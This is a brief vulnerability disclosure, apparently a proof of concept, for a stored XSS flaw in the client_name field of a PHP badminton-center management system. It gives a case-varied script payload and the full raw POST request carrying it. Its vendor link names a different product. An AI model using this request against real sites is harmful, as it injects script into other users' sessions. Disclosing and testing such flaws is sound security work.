# badminton-center-management-system v1.0 - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Date: 2022-05-06

Vulnerability File: /bcms/classes/Master.php?f=save_court_rental

Vulnerability location: /bcms/classes/Master.php?f=save_court_rental, client_name

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST /bcms/classes/Master.php?f=save_court_rental HTTP/1.1
Host: bcms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------176722279832480832321731227058
Content-Length: 1164
Origin: http://bcms.com
Connection: keep-alive
Referer: http://bcms.com/bcms/admin/?page=court_rentals/manage_court_rental&id=5
Cookie: PHPSESSID=bruvaommkrfrt7tjj2m3mr8ui0

-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="id"

5
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="client_name"

<sCrIpT>alert(1)</sCrIpT>
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="contact"

15115111511
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="court_id"

3
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="court_price"

450.00
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="datetime_start"

0222-02-22T22:22
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="hours"

22.00
-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="datetime_end"


-----------------------------176722279832480832321731227058
Content-Disposition: form-data; name="total"

9900.00
-----------------------------176722279832480832321731227058--

```

![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/xss.gif?raw=true)